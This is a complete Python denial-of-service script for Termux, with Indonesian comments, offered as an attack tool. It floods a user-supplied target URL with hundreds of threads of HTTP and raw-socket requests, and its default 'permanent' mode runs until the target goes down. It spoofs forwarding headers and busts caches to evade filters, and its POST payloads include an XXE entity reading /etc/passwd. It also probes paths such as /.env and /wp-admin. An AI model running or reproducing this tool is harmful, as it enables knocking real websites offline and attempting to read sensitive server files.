#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import os
import sys
import random
import socket
import urllib3
from datetime import datetime
from urllib.parse import urlparse

# Matiin warning SSL biar nggak ganggu
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna untuk terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

os.system('clear')

print(Colors.PURPLE + Colors.BOLD + r"""
╔══════════════════════════════════════════════════════════╗
║     █████╗ ██████╗ ██╗██████╗                          ║
║    ██╔══██╗██╔══██╗██║██╔══██╗                         ║
║    ███████║██████╔╝██║██║  ██║                         ║
║    ██╔══██║██╔══██╗██║██║  ██║                         ║
║    ██║  ██║██████╔╝██║██████╔╝                         ║
║    ╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝                          ║
║                                                          ║
║       🔥 DDOS HTTP ULTIMATE 🔥                        ║
║               OLEH: ABID                                ║
║            VERSI: 5.0 GANAS                             ║
╚══════════════════════════════════════════════════════════╝
""" + Colors.RESET)

print(Colors.CYAN + "⚡" + "="*60 + "⚡" + Colors.RESET)
print(Colors.YELLOW + "📅 Tanggal: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + Colors.RESET)
print(Colors.GREEN + "📱 Perangkat: Termux" + Colors.RESET)
print(Colors.RED + "☠️ MODE: ULTIMATE PERMANENT" + Colors.RESET)
print(Colors.CYAN + "⚡" + "="*60 + "⚡\n" + Colors.RESET)

# User Agents random
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; CPH2211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18"
]

# Random query strings buat bypass cache
RANDOM_QUERIES = [
    "?id={}", "?page={}", "?action=test{}", "?q={}", "?search={}",
    "?token={}&session={}", "?user={}&pass={}", "?redirect={}",
    "?callback=jsonp{}", "?format=json&id={}", "?download={}",
    "?file={}.php", "?admin={}", "?debug={}", "?cache={}"
]

# Random POST payloads
POST_PAYLOADS = [
    {"username": "admin{}", "password": "test{}", "submit": "login"},
    {"data": "{}" * 100, "action": "submit", "token": "{}"},
    {"file": "upload{}", "content": "A" * 1000},
    {"query": "SELECT * FROM users WHERE id={}", "debug": "true"},
    {"xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
]

# Random paths
RANDOM_PATHS = [
    "/", "/index.php", "/admin", "/login", "/api", "/search",
    "/wp-admin", "/.env", "/config.php", "/data", "/files",
    "/uploads", "/css/style.css", "/js/main.js", "/images/logo.png",
    "/api/v1/users", "/api/v1/login", "/api/v1/data", "/status"
]

packets_sent = 0
packets_lock = threading.Lock()
errors_count = 0
errors_lock = threading.Lock()

def validate_url(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return parsed.netloc != ''
    except:
        return False

def get_ip_from_url(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        ip = socket.gethostbyname(parsed.netloc)
        return ip
    except:
        return "Tidak diketahui"

def generate_headers():
    """Generate random headers buat bypass filter"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json,text/plain,*/*']),
        'Accept-Language': random.choice(['id-ID,id;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'id-ID,id;q=0.9', 'en-GB,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': random.choice(['keep-alive', 'keep-alive', 'keep-alive', 'close']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Pragma': 'no-cache',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'Referer': random.choice(['http://google.com', 'http://facebook.com', 'http://twitter.com', 'http://bing.com', None]),
    }
    # Random cookies buat bypass
    if random.random() > 0.5:
        headers['Cookie'] = f"session={random.randint(1000,9999)}; token={random.randint(10000,99999)}; user=admin{random.randint(1,999)}"
    
    return {k: v for k, v in headers.items() if v is not None}

def ddos_worker(target_url, duration, thread_id, permanent_mode=False):
    """Pekerja serangan yang lebih ganas"""
    global packets_sent, errors_count
    start_time = time.time()
    local_packets = 0
    local_errors = 0
    
    session = requests.Session()
    session.verify = False
    
    while permanent_mode or (time.time() - start_time < duration):
        try:
            # Random pilih metode serangan
            method = random.choice(['GET', 'POST', 'GET', 'POST', 'GET'])
            
            # Random path
            path = random.choice(RANDOM_PATHS)
            
            # Random query
            query = random.choice(RANDOM_QUERIES).format(random.randint(1, 999999))
            
            # Full URL
            full_url = target_url.rstrip('/') + path + query
            
            headers = generate_headers()
            
            if method == "GET":
                response = session.get(full_url, headers=headers, timeout=2, stream=True)
                # Baca dikit biar koneksi kebuka
                next(response.iter_content(1024), None)
            else:
                payload = random.choice(POST_PAYLOADS)
                # Inject random data
                if isinstance(payload, dict):
                    payload = {k: v.format(random.randint(1, 9999)) if isinstance(v, str) and '{}' in v else v for k, v in payload.items()}
                response = session.post(full_url, headers=headers, timeout=2, data=payload, stream=True)
                next(response.iter_content(1024), None)
            
            with packets_lock:
                packets_sent += 1
                local_packets += 1
            
            if local_packets % 50 == 0:
                print(Colors.GREEN + f"[Thread-{thread_id}] 💀 Dikirim {local_packets} serangan - Status: {response.status_code}" + Colors.RESET)
                
        except:
            with errors_lock:
                errors_count += 1
                local_errors += 1
            
            if local_errors % 20 == 0:
                print(Colors.YELLOW + f"[Thread-{thread_id}] 🔄 Reconnecting... ({local_errors} errors)" + Colors.RESET)
            
            time.sleep(0.01)  # Langsung lanjut serang
    
    session.close()
    print(Colors.BLUE + f"[Thread-{thread_id}] ✅ Selesai - {local_packets} serangan dikirim" + Colors.RESET)

def flood_socket(target_url, duration, thread_id):
    """Serangan socket mentah buat lebih ganas"""
    global packets_sent
    start_time = time.time()
    local_packets = 0
    
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc
        port = 443 if parsed.scheme == 'https' else 80
        
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, port))
                
                # Kirim HTTP request mentah
                request = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                
                with packets_lock:
                    packets_sent += 1
                    local_packets += 1
                
                sock.close()
                
                if local_packets % 100 == 0:
                    print(Colors.CYAN + f"[Socket-{thread_id}] 🔥 {local_packets} koneksi mentah dikirim" + Colors.RESET)
            except:
                pass
            
    except Exception as e:
        print(Colors.RED + f"[Socket-{thread_id}] Error: {e}" + Colors.RESET)

def main():
    print(Colors.BOLD + Colors.CYAN + "\n⚙️  KONFIGURASI ULTIMATE" + Colors.RESET)
    print(Colors.CYAN + "─"*50 + Colors.RESET)
    
    while True:
        target_url = input(Colors.GREEN + "🌐 Masukkan URL target: " + Colors.RESET).strip()
        if validate_url(target_url):
            break
        else:
            print(Colors.RED + "❌ URL tidak valid!" + Colors.RESET)
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        print(Colors.YELLOW + f"📌 Menggunakan: {target_url}" + Colors.RESET)
    
    target_ip = get_ip_from_url(target_url)
    print(Colors.CYAN + f"📌 IP teratasi: {target_ip}" + Colors.RESET)
    
    # Mode serangan
    print(Colors.YELLOW + "\n📋 Mode Serangan:" + Colors.RESET)
    print("1. Timed (durasi tertentu)")
    print("2. PERMANENT (jalan terus sampe target down)")
    
    mode_choice = input(Colors.GREEN + "👉 Pilihan [default: 2]: " + Colors.RESET).strip()
    permanent_mode = mode_choice != "1"
    
    duration = 0
    if not permanent_mode:
        while True:
            try:
                duration_input = input(Colors.GREEN + "⏱️ Durasi serangan (detik) [default: 300]: " + Colors.RESET).strip()
                if duration_input == "":
                    duration = 300
                    break
                duration = int(duration_input)
                if duration > 0:
                    break
            except ValueError:
                print(Colors.RED + "❌ Masukkan angka yang valid!" + Colors.RESET)
    
    while True:
        try:
            threads_input = input(Colors.GREEN + "🧵 Jumlah thread HTTP [default: 200]: " + Colors.RESET).strip()
            if threads_input == "":
                num_threads = 200
                break
            num_threads = int(threads_input)
            if 1 <= num_threads <= 2000:
                break
        except ValueError:
            print(Colors.RED + "❌ Masukkan angka yang valid!" + Colors.RESET)
    
    while True:
        try:
            socket_threads_input = input(Colors.GREEN + "🔌 Jumlah thread socket [default: 50]: " + Colors.RESET).strip()
            if socket_threads_input == "":
                num_socket_threads = 50
                break
            num_socket_threads = int(socket_threads_input)
            if 0 <= num_socket_threads <= 500:
                break
        except ValueError:
            print(Colors.RED + "❌ Masukkan angka yang valid!" + Colors.RESET)
    
    print(Colors.CYAN + "\n" + "─"*50 + Colors.RESET)
    print(Colors.BOLD + Colors.YELLOW + "📊 Ringkasan Serangan Ultimate:" + Colors.RESET)
    print(f"   URL: {target_url}")
    print(f"   IP: {target_ip}")
    if permanent_mode:
        print(f"   Mode: PERMANENT (∞)")
    else:
        print(f"   Durasi: {duration} detik")
    print(f"   Thread HTTP: {num_threads}")
    print(f"   Thread Socket: {num_socket_threads}")
    print(f"   Total threads: {num_threads + num_socket_threads}")
    print(Colors.RED + f"   Estimasi serangan/detik: {(num_threads + num_socket_threads) * 10}+" + Colors.RESET)
    print(Colors.CYAN + "─"*50 + Colors.RESET)
    
    confirm = input(Colors.YELLOW + "⚠️  Mulai serangan? (y/n): " + Colors.RESET).lower().strip()
    if confirm != 'y':
        print(Colors.RED + "❌ Serangan dibatalkan!" + Colors.RESET)
        return
    
    if permanent_mode:
        print(Colors.RED + Colors.BOLD + f"\n🔥 SERANGAN PERMANENT DIMULAI ke {target_url}" + Colors.RESET)
        print(Colors.RED + "☠️ Target TIDAK AKAN pulih sampai lo stop manual (Ctrl+C)" + Colors.RESET)
        duration = 999999999  # Praktis permanen
    else:
        print(Colors.RED + Colors.BOLD + f"\n🔥 SERANGAN DIMULAI ke {target_url}" + Colors.RESET)
    
    print(Colors.YELLOW + f"🧵 Thread: {num_threads + num_socket_threads}\n" + Colors.RESET)
    
    threads = []
    start_time = time.time()
    global packets_sent, errors_count
    packets_sent = 0
    errors_count = 0
    
    try:
        # Start HTTP threads
        for i in range(num_threads):
            thread = threading.Thread(target=ddos_worker, args=(target_url, duration, i+1, permanent_mode))
            threads.append(thread)
            thread.start()
            if i % 20 == 0:
                print(Colors.BLUE + f"✓ HTTP Thread {i+1} dimulai" + Colors.RESET)
        
        # Start socket threads
        for i in range(num_socket_threads):
            thread = threading.Thread(target=flood_socket, args=(target_url, duration, i+1))
            threads.append(thread)
            thread.start()
            if i % 10 == 0:
                print(Colors.CYAN + f"✓ Socket Thread {i+1} dimulai" + Colors.RESET)
        
        # Monitor thread
        def monitor():
            while any(t.is_alive() for t in threads):
                elapsed = time.time() - start_time
                print(Colors.PURPLE + f"\r💀 [{elapsed:.0f}s] Total serangan: {packets_sent} | Rate: {packets_sent/elapsed:.1f}/s | Errors: {errors_count}" + Colors.RESET, end='')
                time.sleep(2)
        
        monitor_thread = threading.Thread(target=monitor)
        monitor_thread.start()
        threads.append(monitor_thread)
        
        for thread in threads:
            thread.join()
        
        elapsed_time = time.time() - start_time
        print(Colors.GREEN + Colors.BOLD + f"\n\n✅ SERANGAN SELESAI!" + Colors.RESET)
        print(Colors.GREEN + f"📊 Total serangan: {packets_sent}" + Colors.RESET)
        print(Colors.GREEN + f"⏱️ Waktu: {elapsed_time:.2f} detik" + Colors.RESET)
        print(Colors.GREEN + f"📈 Rate: {packets_sent/elapsed_time:.2f} serangan/detik" + Colors.RESET)
        
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        print(Colors.YELLOW + Colors.BOLD + f"\n\n⚠️ DIHENTIKAN PENGGUNA!" + Colors.RESET)
        print(Colors.YELLOW + f"📊 Total serangan: {packets_sent}" + Colors.RESET)
        print(Colors.YELLOW + f"⏱️ Waktu berjalan: {elapsed_time:.2f} detik" + Colors.RESET)
        if elapsed_time > 0:
            print(Colors.YELLOW + f"📈 Rate: {packets_sent/elapsed_time:.2f} serangan/detik" + Colors.RESET)
    except Exception as e:
        print(Colors.RED + f"\n❌ Error: {e}" + Colors.RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n\n👋 Sampai jumpa!" + Colors.RESET)
    except Exception as e:
        print(Colors.RED + f"\n❌ Error fatal: {e}" + Colors.RESET)
    
    print(Colors.PURPLE + "\n" + "⚡"*50 + Colors.RESET)
    print(Colors.CYAN + "✨ Dibuat oleh ABID - ULTIMATE VERSION" + Colors.RESET)
    print(Colors.RED + "☠️ Gunakan dengan tanggung jawab penuh" + Colors.RESET)
    print(Colors.PURPLE + "⚡"*50 + Colors.RESET)